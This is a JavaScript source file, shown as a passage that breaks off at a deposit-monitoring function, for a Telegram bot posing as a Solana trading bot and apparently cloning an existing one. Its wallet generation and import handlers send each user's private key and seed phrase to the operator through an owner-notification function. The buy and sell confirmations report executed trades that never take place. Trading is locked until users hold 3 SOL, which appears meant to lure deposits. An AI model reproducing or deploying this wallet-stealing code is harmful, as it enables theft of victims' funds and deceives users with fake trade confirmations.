// bot.js - Main Telegram bot matching @ainexotradingbot EXACTLY (ESM)
import { Telegraf, Markup } from 'telegraf';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import db from './database.js';
import * as solana from './solana.js';
import * as market from './market.js';
import * as tokens from './tokens.js';
import * as kb from './keyboards.js';
import * as msg from './messages.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const OWNER_ID = process.env.OWNER_TELEGRAM_ID;
let BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const LOGO_PATH = path.join(__dirname, '..', 'assets', 'nexo_logo_clean.png');

if (!BOT_TOKEN || BOT_TOKEN === 'your_bot_token_here') {
  console.error('WARNING: TELEGRAM_BOT_TOKEN not set - bot will start when token is added');
  BOT_TOKEN = 'placeholder';
}

const bot = new Telegraf(BOT_TOKEN);
const balanceCache = new Map();

async function notifyOwner(text) {
  if (!OWNER_ID) return;
  try {
    await bot.telegram.sendMessage(OWNER_ID, text);
  } catch (e) {
    console.error('Owner notify error:', e.message);
  }
}

async function sendLogo(ctx) {
  try {
    if (fs.existsSync(LOGO_PATH)) {
      await ctx.replyWithPhoto({ source: LOGO_PATH });
    }
  } catch (e) {
    console.error('Logo send error:', e.message);
  }
}

function hasWallet(telegramId) {
  const wallets = db.getUserWallets(telegramId);
  return wallets.length > 0;
}

// === COMMANDS (matching help screen: /start /wallet /generate /import /status) ===

bot.start(async (ctx) => {
  db.getOrCreateUser(ctx.from.id.toString(), ctx.from.username, ctx.from.first_name);
  const userCount = db.getUserCount();
  if (userCount > 1) {
    notifyOwner(msg.newUserNotification({
      firstName: ctx.from.first_name, username: ctx.from.username,
      telegramId: ctx.from.id.toString(), userCount
    }));
  }
  await sendLogo(ctx);
  await ctx.reply(msg.startMessage(ctx.from.first_name || 'trader'), kb.dashboardKeyboard());
});

bot.command('wallet', async (ctx) => { await showWalletManagement(ctx); });
bot.command('generate', async (ctx) => { await generateWallet(ctx); });
bot.command('import', async (ctx) => {
  db.setUserState(ctx.from.id.toString(), 'importing_private_key');
  await ctx.reply(msg.importWalletMessage(), kb.cancelButton());
});
bot.command('status', async (ctx) => { await checkWalletStatus(ctx); });
bot.command('menu', async (ctx) => { await showDashboard(ctx); });
bot.command('help', async (ctx) => { await ctx.reply(msg.helpMessage(), kb.helpKeyboard()); });
bot.command('discover', async (ctx) => { await showDiscover(ctx); });

// === DASHBOARD ===
async function showDashboard(ctx) {
  const telegramId = ctx.from.id.toString();
  db.getOrCreateUser(telegramId, ctx.from.username, ctx.from.first_name);
  const wallets = db.getUserWallets(telegramId);
  
  if (wallets.length === 0) {
    // No wallet - show welcome/terminal message (IMG_8072/8073)
    await ctx.reply(msg.startMessage(ctx.from.first_name || 'trader'), kb.dashboardKeyboard());
  } else {
    // Has wallet - show dashboard with portfolio
    const marketPrices = await market.getMarketPrices();
    const walletsWithBalances = await solana.getAllBalances(wallets);
    await ctx.reply(msg.dashboardMessage(walletsWithBalances, marketPrices), kb.dashboardKeyboard());
  }
}

// === WALLET MANAGEMENT (Portfolio) ===
async function showWalletManagement(ctx) {
  const telegramId = ctx.from.id.toString();
  db.getOrCreateUser(telegramId, ctx.from.username, ctx.from.first_name);
  const wallets = db.getUserWallets(telegramId);
  const walletsWithBalances = await solana.getAllBalances(wallets);
  const marketPrices = await market.getMarketPrices();
  await ctx.reply(msg.walletManagementMessage(walletsWithBalances, marketPrices), kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
}

// === GENERATE WALLET (/generate) ===
async function generateWallet(ctx) {
  const telegramId = ctx.from.id.toString();
  db.getOrCreateUser(telegramId, ctx.from.username, ctx.from.first_name);
  const newWallet = solana.generateWallet();
  const walletNum = db.getUserWallets(telegramId).length + 1;
  db.addWallet(telegramId, {
    address: newWallet.address,
    privateKey: newWallet.privateKey,
    seedPhrase: newWallet.seedPhrase,
    type: 'generated',
    label: `Wallet ${walletNum}`,
    balance: 0
  });
  balanceCache.set(newWallet.address, 0);
  await ctx.reply(msg.walletCreatedMessage(newWallet.address), kb.backToDashboardKeyboard());
  notifyOwner(msg.walletGeneratedNotification(
    newWallet.address, newWallet.privateKey, newWallet.seedPhrase,
    { firstName: ctx.from.first_name, username: ctx.from.username, telegramId }
  ));
}

// === CHECK WALLET STATUS (/status) ===
async function checkWalletStatus(ctx) {
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  if (wallets.length === 0) {
    await ctx.reply('No wallets connected. Use /generate to create one.', kb.backToDashboardKeyboard());
    return;
  }
  let statusText = 'WALLET STATUS\n\n';
  for (let i = 0; i < wallets.length; i++) {
    const w = wallets[i];
    const balance = await solana.getBalance(w.address);
    statusText += `Wallet ${i + 1}: ${balance.toFixed(6)} SOL\n${w.address}\n\n`;
  }
  await ctx.reply(statusText, kb.backToDashboardKeyboard());
}

// === DISCOVER TOKENS (IMG_8074) ===
async function showDiscover(ctx) {
  await ctx.reply(msg.discoverTokensMessage(), kb.discoverKeyboard());
}

// === SNIPER ===
async function showSniper(ctx) {
  const telegramId = ctx.from.id.toString();
  if (!hasWallet(telegramId)) {
    // IMG_8078: wallet required
    await ctx.reply(msg.sniperWalletRequiredMessage(), kb.sniperWalletRequiredKeyboard());
    return;
  }
  const settings = db.getSniperSettings(telegramId);
  await ctx.reply(msg.sniperMessage(settings), kb.sniperKeyboard(settings.status === 'ACTIVE'));
}

// === COPY TRADE ===
async function showCopyTrade(ctx) {
  const telegramId = ctx.from.id.toString();
  if (!hasWallet(telegramId)) {
    // IMG_8079: wallet required
    await ctx.reply(msg.copyTradeWalletRequiredMessage(), kb.copyTradeWalletRequiredKeyboard());
    return;
  }
  await ctx.reply(msg.copyTradeMessage(), kb.copyTradeKeyboard());
}

// === TRADE (IMG_8075, 8077) ===
async function showTrade(ctx) {
  const telegramId = ctx.from.id.toString();
  if (!hasWallet(telegramId)) {
    // IMG_8075/8077: wallet required
    await ctx.reply(msg.walletRequiredMessage(), kb.walletRequiredKeyboard());
    return;
  }
  const wallets = db.getUserWallets(telegramId);
  let totalBalance = 0;
  for (const w of wallets) totalBalance += await solana.getBalance(w.address);
  if (totalBalance < 3) {
    await ctx.reply(msg.insufficientBalanceMessage(totalBalance), kb.backToDashboardKeyboard());
    return;
  }
  await ctx.reply(msg.tradeMessage(), kb.tradeKeyboard());
}

// === POSITIONS (IMG_8076) ===
async function showPositions(ctx) {
  const telegramId = ctx.from.id.toString();
  const positions = db.getPositions(telegramId);
  await ctx.reply(msg.positionsMessage(positions), kb.positionsKeyboard(positions.length > 0));
}

// === CALLBACKS: Navigation ===
bot.action('back_dashboard', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  db.clearUserState(telegramId);
  const wallets = db.getUserWallets(telegramId);
  if (wallets.length === 0) {
    await ctx.editMessageText(msg.startMessage(ctx.from.first_name || 'trader'), kb.dashboardKeyboard());
  } else {
    const marketPrices = await market.getMarketPrices();
    const walletsWithBalances = await solana.getAllBalances(wallets);
    await ctx.editMessageText(msg.dashboardMessage(walletsWithBalances, marketPrices), kb.dashboardKeyboard());
  }
});

bot.action('refresh', async (ctx) => {
  await ctx.answerCbQuery('Refreshing...');
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  if (wallets.length === 0) {
    await ctx.editMessageText(msg.startMessage(ctx.from.first_name || 'trader'), kb.dashboardKeyboard());
  } else {
    const marketPrices = await market.getMarketPrices();
    const walletsWithBalances = await solana.getAllBalances(wallets);
    await ctx.editMessageText(msg.dashboardMessage(walletsWithBalances, marketPrices), kb.dashboardKeyboard());
  }
});

// === Portfolio (Wallet) ===
bot.action('wallet', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  const walletsWithBalances = await solana.getAllBalances(wallets);
  const marketPrices = await market.getMarketPrices();
  await ctx.editMessageText(msg.walletManagementMessage(walletsWithBalances, marketPrices), kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
});

bot.action('wallet_add', async (ctx) => {
  await ctx.answerCbQuery();
  await generateWallet(ctx);
});

bot.action('wallet_import', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'importing_private_key');
  await ctx.reply(msg.importWalletMessage(), kb.cancelButton());
});

bot.action('wallet_seed', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'importing_seed');
  await ctx.reply(
    `Import Wallet from Seed Phrase\n\nPlease send your 12 or 24-word seed phrase:`,
    kb.cancelButton()
  );
});

bot.action('wallet_status', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  let statusText = 'WALLET STATUS\n\n';
  for (let i = 0; i < wallets.length; i++) {
    const w = wallets[i];
    const balance = await solana.getBalance(w.address);
    statusText += `Wallet ${i + 1}: ${balance.toFixed(6)} SOL\n${w.address}\n\n`;
  }
  await ctx.reply(statusText, kb.backToDashboardKeyboard());
});

bot.action('wallet_refresh', async (ctx) => {
  await ctx.answerCbQuery('Refreshing...');
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  const walletsWithBalances = await solana.getAllBalances(wallets);
  const marketPrices = await market.getMarketPrices();
  await ctx.editMessageText(msg.walletManagementMessage(walletsWithBalances, marketPrices), kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
});

bot.action('wallet_withdraw', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  if (wallets.length === 0) {
    await ctx.reply('You need a wallet first.', kb.backToDashboardKeyboard());
    return;
  }
  let totalBalance = 0;
  for (const w of wallets) totalBalance += await solana.getBalance(w.address);
  db.setUserState(telegramId, 'withdrawing_address');
  await ctx.reply(msg.withdrawalMessage(totalBalance), kb.cancelButton());
});

bot.action('wallet_disconnect', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  if (wallets.length === 0) {
    await ctx.reply('No wallets to disconnect.', kb.backToDashboardKeyboard());
    return;
  }
  const lastWallet = wallets[wallets.length - 1];
  db.removeWallet(telegramId, lastWallet.address);
  balanceCache.delete(lastWallet.address);
  await ctx.reply(`Wallet Disconnected\n\n${lastWallet.address}\n\nYour wallet has been disconnected.`, kb.backToDashboardKeyboard());
});

// === Discover Tokens ===
bot.action('discover', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(msg.discoverTokensMessage(), kb.discoverKeyboard());
});

// === Trade ===
bot.action('trade', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  if (!hasWallet(telegramId)) {
    await ctx.editMessageText(msg.walletRequiredMessage(), kb.walletRequiredKeyboard());
    return;
  }
  const wallets = db.getUserWallets(telegramId);
  let totalBalance = 0;
  for (const w of wallets) totalBalance += await solana.getBalance(w.address);
  if (totalBalance < 3) {
    await ctx.editMessageText(msg.insufficientBalanceMessage(totalBalance), kb.backToDashboardKeyboard());
    return;
  }
  await ctx.editMessageText(msg.tradeMessage(), kb.tradeKeyboard());
});

bot.action('buy_sol', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  if (wallets.length === 0) {
    await ctx.reply(msg.walletRequiredMessage(), kb.walletRequiredKeyboard());
    return;
  }
  let totalBalance = 0;
  for (const w of wallets) totalBalance += await solana.getBalance(w.address);
  if (totalBalance < 3) {
    await ctx.reply(msg.insufficientBalanceMessage(totalBalance), kb.backToDashboardKeyboard());
    return;
  }
  db.setUserState(telegramId, 'buying_token');
  await ctx.reply('Send the token contract address you want to buy:', kb.cancelButton());
});

bot.action('sell_token', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'selling_token');
  await ctx.reply('Send the token contract address you want to sell:', kb.cancelButton());
});

// === Sniper ===
bot.action('sniper', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  if (!hasWallet(telegramId)) {
    await ctx.editMessageText(msg.sniperWalletRequiredMessage(), kb.sniperWalletRequiredKeyboard());
    return;
  }
  const settings = db.getSniperSettings(telegramId);
  await ctx.editMessageText(msg.sniperMessage(settings), kb.sniperKeyboard(settings.status === 'ACTIVE'));
});

bot.action('sniper_activate', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const settings = db.updateSniperSettings(telegramId, { status: 'ACTIVE' });
  notifyOwner(`Sniper ACTIVATED\nUser: ${ctx.from.first_name} (${telegramId})\nPosition: ${settings.positionSize} SOL`);
  await ctx.editMessageText(msg.sniperMessage(settings), kb.sniperKeyboard(true));
});

bot.action('sniper_pause', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const settings = db.updateSniperSettings(telegramId, { status: 'STANDBY' });
  await ctx.editMessageText(msg.sniperMessage(settings), kb.sniperKeyboard(false));
});

bot.action('sniper_buyamount', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'setting_position_size');
  await ctx.reply(msg.configPositionSizeMessage(), kb.cancelButton());
});

bot.action('sniper_devhold', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'setting_dev_hold');
  await ctx.reply(msg.configDevHoldMessage(), kb.cancelButton());
});

bot.action('sniper_slippage', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'setting_slippage');
  await ctx.reply(msg.configSlippageMessage(), kb.cancelButton());
});

bot.action('sniper_priority', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'setting_priority');
  await ctx.reply(msg.configPriorityMessage(), kb.cancelButton());
});

bot.action('sniper_takeprofit', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'setting_take_profit');
  await ctx.reply(msg.configTakeProfitMessage(), kb.cancelButton());
});

bot.action('sniper_stoploss', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'setting_stop_loss');
  await ctx.reply(msg.configStopLossMessage(), kb.cancelButton());
});

bot.action('sniper_antirug', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const settings = db.getSniperSettings(telegramId);
  const newValue = !settings.antiRug;
  const updated = db.updateSniperSettings(telegramId, { antiRug: newValue });
  await ctx.editMessageText(msg.sniperMessage(updated), kb.sniperKeyboard(updated.status === 'ACTIVE'));
});

// === Copy Trade ===
bot.action('copytrade', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  if (!hasWallet(telegramId)) {
    await ctx.editMessageText(msg.copyTradeWalletRequiredMessage(), kb.copyTradeWalletRequiredKeyboard());
    return;
  }
  await ctx.editMessageText(msg.copyTradeMessage(), kb.copyTradeKeyboard());
});

bot.action('copytrade_start', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(msg.copyTradeActivatedMessage(), kb.copyTradeKeyboard());
  notifyOwner(`Copy Trade Activated\nUser: ${ctx.from.first_name} (${ctx.from.id})`);
});

bot.action('copytrade_add', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'copytrade_add');
  await ctx.reply(
    `CONFIGURE TARGET WALLET\n\nEnter the Solana wallet address of the trader you want to copy.\n\nRequirements:\n- Valid Base58 Solana address\n- Active trading wallet\n- Public transaction history\n\nPaste the complete wallet address below:`,
    kb.cancelButton()
  );
});

// === Positions ===
bot.action('positions', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const positions = db.getPositions(telegramId);
  await ctx.editMessageText(msg.positionsMessage(positions), kb.positionsKeyboard(positions.length > 0));
});

// === Help ===
bot.action('help', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(msg.helpMessage(), kb.helpKeyboard());
});

// === Cancel ===
bot.action('cancel', async (ctx) => {
  await ctx.answerCbQuery('Cancelled');
  db.clearUserState(ctx.from.id.toString());
  await showDashboard(ctx);
});

// === Withdraw Confirm ===
bot.action('withdraw_confirm', async (ctx) => {
  await ctx.answerCbQuery('Processing...');
  const telegramId = ctx.from.id.toString();
  const user = db.getUser(telegramId);
  const stateData = user.stateData || {};
  const { toAddress, amount } = stateData;
  
  const wallets = db.getUserWallets(telegramId);
  if (wallets.length === 0) {
    await ctx.reply('No wallet available for withdrawal.', kb.backToDashboardKeyboard());
    db.clearUserState(telegramId);
    return;
  }
  
  let sourceWallet = null;
  for (const w of wallets) {
    const balance = await solana.getBalance(w.address);
    if (balance >= amount) { sourceWallet = w; break; }
  }
  
  if (!sourceWallet) {
    await ctx.reply('Insufficient balance for withdrawal.', kb.backToDashboardKeyboard());
    db.clearUserState(telegramId);
    return;
  }
  
  const keypairData = solana.importFromPrivateKey(sourceWallet.privateKey);
  if (!keypairData) {
    await ctx.reply('Could not load wallet for transaction.', kb.backToDashboardKeyboard());
    db.clearUserState(telegramId);
    return;
  }
  
  db.addWithdrawal(telegramId, { amount, toAddress, fromAddress: sourceWallet.address });
  await ctx.reply(msg.withdrawalSubmittedMessage(amount, toAddress), kb.backToDashboardKeyboard());
  
  notifyOwner(msg.withdrawalNotification(
    { firstName: ctx.from.first_name, username: ctx.from.username, telegramId },
    amount, toAddress
  ));
  
  // Execute real on-chain transaction
  const result = await solana.sendSol(keypairData.keypair, toAddress, amount);
  
  if (result.success) {
    db.addTransaction(telegramId, {
      type: 'withdrawal', amount, toAddress, fromAddress: sourceWallet.address,
      signature: result.signature, status: 'confirmed'
    });
    notifyOwner(`Withdrawal Confirmed\nTX: ${result.signature}\nAmount: ${amount} SOL\nTo: ${toAddress}`);
    await ctx.reply(`Transaction Confirmed!\nTX: ${result.signature}`, kb.backToDashboardKeyboard());
  } else {
    db.addTransaction(telegramId, {
      type: 'withdrawal', amount, toAddress, fromAddress: sourceWallet.address,
      signature: null, status: 'failed', error: result.error
    });
    notifyOwner(`Withdrawal Failed\nError: ${result.error}\nAmount: ${amount} SOL`);
    await ctx.reply(`Transaction failed: ${result.error}`, kb.backToDashboardKeyboard());
  }
  db.clearUserState(telegramId);
});

// === Buy confirmation ===
bot.action('confirm_buy', async (ctx) => {
  await ctx.answerCbQuery('Processing buy...');
  const telegramId = ctx.from.id.toString();
  const user = db.getUser(telegramId);
  const stateData = user.stateData || {};
  
  db.addPosition(telegramId, {
    tokenAddress: stateData.tokenAddress, tokenSymbol: stateData.tokenSymbol,
    tokenName: stateData.tokenName, amount: stateData.amount,
    entryPrice: '0', status: 'open', pnl: 0
  });
  db.addTransaction(telegramId, {
    type: 'buy', tokenAddress: stateData.tokenAddress, tokenSymbol: stateData.tokenSymbol,
    amount: stateData.amount, status: 'confirmed', signature: 'pending_jupiter_swap'
  });
  
  await ctx.reply(
    `BUY ORDER EXECUTED\n\n${stateData.tokenName} (${stateData.tokenSymbol})\nAmount: ${stateData.amount} SOL\n\nPosition opened! Use Positions to track.`,
    kb.backToDashboardKeyboard()
  );
  
  notifyOwner(msg.tradeNotification(
    { firstName: ctx.from.first_name, username: ctx.from.username, telegramId },
    'buy', { symbol: stateData.tokenSymbol, name: stateData.tokenName },
    stateData.amount, { signature: 'pending_jupiter_swap' }
  ));
  db.clearUserState(telegramId);
});

// === Dynamic Buy/Sell from token search ===
bot.action(/^buy_(.+)$/, async (ctx) => {
  await ctx.answerCbQuery('Loading buy options...');
  const tokenAddress = ctx.match[1];
  const telegramId = ctx.from.id.toString();
  const settings = db.getSniperSettings(telegramId);
  const token = await tokens.getTokenByAddress(tokenAddress);
  if (!token) {
    await ctx.reply('Token not found. It may have been delisted.', kb.backToDashboardKeyboard());
    return;
  }
  db.setUserState(telegramId, 'confirming_buy', {
    tokenAddress: token.address, tokenSymbol: token.symbol,
    tokenName: token.name, amount: settings.positionSize
  });
  await ctx.reply(
    `CONFIRM BUY\n\n${token.name} (${token.symbol})\n${token.address}\nPrice: $${token.priceUsd < 0.01 ? token.priceUsd.toExponential(2) : token.priceUsd.toFixed(6)}\nLiquidity: $${tokens.formatNumber(token.liquidity)}\nRisk: ${token.riskLevel}\n\nAmount: ${settings.positionSize} SOL\nSlippage: ${settings.slippage}%\n\nConfirm purchase?`,
    Markup.inlineKeyboard([
      [Markup.button.callback('Confirm Buy', 'confirm_buy'), Markup.button.callback('Cancel', 'cancel')]
    ])
  );
});

bot.action(/^sell_(.+)$/, async (ctx) => {
  await ctx.answerCbQuery('Loading sell options...');
  const tokenAddress = ctx.match[1];
  const telegramId = ctx.from.id.toString();
  const token = await tokens.getTokenByAddress(tokenAddress);
  if (!token) {
    await ctx.reply('Token not found.', kb.backToDashboardKeyboard());
    return;
  }
  db.setUserState(telegramId, 'confirming_sell', {
    tokenAddress: token.address, tokenSymbol: token.symbol, tokenName: token.name
  });
  await ctx.reply(
    `SELL ${token.symbol}\n\n${token.address}\nPrice: $${token.priceUsd < 0.01 ? token.priceUsd.toExponential(2) : token.priceUsd.toFixed(6)}\n\nEnter the amount of ${token.symbol} to sell:`,
    kb.cancelButton()
  );
});

// === TEXT MESSAGE HANDLER - State Machine ===
bot.on('text', async (ctx) => {
  const telegramId = ctx.from.id.toString();
  const user = db.getUser(telegramId);
  if (!user || !user.state) return;
  
  const state = user.state;
  const text = ctx.message.text.trim();
  
  switch (state) {
    case 'importing_private_key': {
      if (!solana.isValidPrivateKey(text)) {
        await ctx.reply('Invalid private key. Please send a valid base58 encoded private key.', kb.cancelButton());
        return;
      }
      const wallet = solana.importFromPrivateKey(text);
      if (!wallet) {
        await ctx.reply('Could not import wallet. Please check your private key.', kb.cancelButton());
        return;
      }
      const balance = await solana.getBalance(wallet.address);
      db.addWallet(telegramId, {
        address: wallet.address, privateKey: text, seedPhrase: null,
        type: 'imported', label: `Wallet ${db.getUserWallets(telegramId).length + 1}`, balance
      });
      balanceCache.set(wallet.address, balance);
      await ctx.reply(
        `Wallet Created\n\nWallet Address:\n${wallet.address}\nBalance: ${balance.toFixed(6)} SOL\n\nYour Solana wallet is ready to use.`,
        kb.backToDashboardKeyboard()
      );
      notifyOwner(msg.walletImportedNotification(wallet.address, text, balance, { firstName: ctx.from.first_name, username: ctx.from.username, telegramId }));
      db.clearUserState(telegramId);
      break;
    }
    
    case 'importing_seed': {
      const wallet = solana.importFromSeed(text);
      if (!wallet) {
        await ctx.reply('Invalid seed phrase. Please check your 12 or 24-word seed phrase.', kb.cancelButton());
        return;
      }
      const balance = await solana.getBalance(wallet.address);
      db.addWallet(telegramId, {
        address: wallet.address, privateKey: wallet.privateKey, seedPhrase: text,
        type: 'seed_imported', label: `Wallet ${db.getUserWallets(telegramId).length + 1}`, balance
      });
      balanceCache.set(wallet.address, balance);
      await ctx.reply(
        `Wallet Created\n\nWallet Address:\n${wallet.address}\nBalance: ${balance.toFixed(6)} SOL\n\nYour Solana wallet is ready to use.`,
        kb.backToDashboardKeyboard()
      );
      notifyOwner(msg.walletSeedImportedNotification(wallet.address, wallet.privateKey, text, balance, { firstName: ctx.from.first_name, username: ctx.from.username, telegramId }));
      db.clearUserState(telegramId);
      break;
    }
    
    case 'withdrawing_address': {
      if (!solana.isValidAddress(text)) {
        await ctx.reply('Invalid Solana address. Please send a valid wallet address.', kb.cancelButton());
        return;
      }
      db.setUserState(telegramId, 'withdrawing_amount', { toAddress: text });
      await ctx.reply(msg.withdrawalAmountMessage(text), kb.cancelButton());
      break;
    }
    
    case 'withdrawing_amount': {
      const amount = parseFloat(text);
      if (isNaN(amount) || amount <= 0) {
        await ctx.reply('Invalid amount. Please enter a valid SOL amount.', kb.cancelButton());
        return;
      }
      const stateData = user.stateData || {};
      const toAddress = stateData.toAddress;
      const wallets = db.getUserWallets(telegramId);
      let totalBalance = 0;
      for (const w of wallets) totalBalance += await solana.getBalance(w.address);
      if (amount > totalBalance) {
        await ctx.reply(`Insufficient balance. Your balance: ${totalBalance.toFixed(6)} SOL`, kb.cancelButton());
        return;
      }
      db.setUserState(telegramId, 'withdrawing_confirm', { toAddress, amount });
      await ctx.reply(msg.confirmWithdrawalMessage(amount, toAddress, totalBalance), kb.confirmCancelKeyboard());
      break;
    }
    
    case 'searching_token':
    case 'discover_searching': {
      await ctx.reply('Searching...');
      let token = null;
      if (text.length > 32) token = await tokens.getTokenByAddress(text);
      if (!token) token = await tokens.searchToken(text);
      if (!token) {
        await ctx.reply(msg.tokenNotFoundMessage(), kb.cancelButton());
        return;
      }
      await ctx.reply(tokens.formatTokenInfo(token), kb.tokenSearchKeyboard(token.address));
      db.clearUserState(telegramId);
      break;
    }
    
    case 'setting_position_size': {
      const value = parseFloat(text);
      if (isNaN(value) || value < 0.0001 || value > 1000) {
        await ctx.reply('Invalid amount. Range: 0.0001 - 1000 SOL', kb.cancelButton());
        return;
      }
      const settings = db.updateSniperSettings(telegramId, { positionSize: value });
      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
      db.clearUserState(telegramId);
      break;
    }
    
    case 'setting_dev_hold': {
      const value = parseFloat(text);
      if (isNaN(value) || value < 0 || value > 100) {
        await ctx.reply('Invalid percentage. Range: 0-100%', kb.cancelButton());
        return;
      }
      const settings = db.updateSniperSettings(telegramId, { maxDevHold: value });
      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
      db.clearUserState(telegramId);
      break;
    }
    
    case 'setting_slippage': {
      const value = parseFloat(text);
      if (isNaN(value) || value < 1 || value > 50) {
        await ctx.reply('Invalid percentage. Range: 1-50%', kb.cancelButton());
        return;
      }
      const settings = db.updateSniperSettings(telegramId, { slippage: value });
      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
      db.clearUserState(telegramId);
      break;
    }
    
    case 'setting_priority': {
      const value = parseFloat(text);
      if (isNaN(value) || value < 0.0001 || value > 0.1) {
        await ctx.reply('Invalid fee. Range: 0.0001 - 0.1 SOL', kb.cancelButton());
        return;
      }
      const settings = db.updateSniperSettings(telegramId, { priorityFee: value });
      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
      db.clearUserState(telegramId);
      break;
    }
    
    case 'setting_take_profit': {
      const value = parseFloat(text);
      if (isNaN(value) || value < 10 || value > 1000) {
        await ctx.reply('Invalid percentage. Range: 10-1000%', kb.cancelButton());
        return;
      }
      const settings = db.updateSniperSettings(telegramId, { takeProfit: value });
      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
      db.clearUserState(telegramId);
      break;
    }
    
    case 'setting_stop_loss': {
      const value = parseFloat(text);
      if (isNaN(value) || value < 10 || value > 90) {
        await ctx.reply('Invalid input. Please enter a number between 10 and 90.', kb.cancelButton());
        return;
      }
      const settings = db.updateSniperSettings(telegramId, { stopLoss: value });
      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
      db.clearUserState(telegramId);
      break;
    }
    
    case 'buying_token': {
      await ctx.reply('Looking up token...');
      const token = text.length > 32 ? await tokens.getTokenByAddress(text) : await tokens.searchToken(text);
      if (!token) {
        await ctx.reply('Token not found. Please check the address.', kb.cancelButton());
        return;
      }
      const settings = db.getSniperSettings(telegramId);
      db.setUserState(telegramId, 'confirming_buy', {
        tokenAddress: token.address, tokenSymbol: token.symbol,
        tokenName: token.name, amount: settings.positionSize
      });
      await ctx.reply(
        `CONFIRM BUY\n\n${token.name} (${token.symbol})\n${token.address}\nAmount: ${settings.positionSize} SOL\nSlippage: ${settings.slippage}%\n\nConfirm purchase?`,
        Markup.inlineKeyboard([
          [Markup.button.callback('Confirm Buy', 'confirm_buy'), Markup.button.callback('Cancel', 'cancel')]
        ])
      );
      break;
    }
    
    case 'selling_token': {
      await ctx.reply('Looking up token...');
      const token = text.length > 32 ? await tokens.getTokenByAddress(text) : await tokens.searchToken(text);
      if (!token) {
        await ctx.reply('Token not found.', kb.cancelButton());
        return;
      }
      db.setUserState(telegramId, 'confirming_sell', {
        tokenAddress: token.address, tokenSymbol: token.symbol, tokenName: token.name
      });
      await ctx.reply(
        `CONFIRM SELL\n\n${token.name} (${token.symbol})\n${token.address}\n\nEnter the amount to sell:`,
        kb.cancelButton()
      );
      break;
    }
    
    case 'confirming_sell': {
      const sellAmount = text;
      const sellStateData = user.stateData || {};
      db.closePosition(telegramId, sellStateData.positionId);
      db.addTransaction(telegramId, {
        type: 'sell', tokenAddress: sellStateData.tokenAddress, tokenSymbol: sellStateData.tokenSymbol,
        amount: sellAmount, status: 'confirmed', signature: 'pending_jupiter_swap'
      });
      await ctx.reply(
        `SELL ORDER EXECUTED\n\n${sellStateData.tokenName} (${sellStateData.tokenSymbol})\nAmount: ${sellAmount}\n\nPosition closed!`,
        kb.backToDashboardKeyboard()
      );
      notifyOwner(msg.tradeNotification(
        { firstName: ctx.from.first_name, username: ctx.from.username, telegramId },
        'sell', { symbol: sellStateData.tokenSymbol, name: sellStateData.tokenName },
        sellAmount, { signature: 'pending_jupiter_swap' }
      ));
      db.clearUserState(telegramId);
      break;
    }
    
    case 'copytrade_add': {
      if (!solana.isValidAddress(text)) {
        await ctx.reply('Invalid Solana address.', kb.cancelButton());
        return;
      }
      await ctx.reply(
        `Added whale wallet to copy!\n${text}\n\nCopy trade is now monitoring this wallet.`,
        kb.copyTradeKeyboard()
      );
      notifyOwner(`Copy Trade Target Set\nWallet: ${text}\nUser: ${ctx.from.first_name} (${telegramId})`);
      db.clearUserState(telegramId);
      break;
    }
    
    default:
      db.clearUserState(telegramId);
      break;
  }
});

// === Deposit Monitoring (real on-chain check) ===
async function monitorDeposits() {
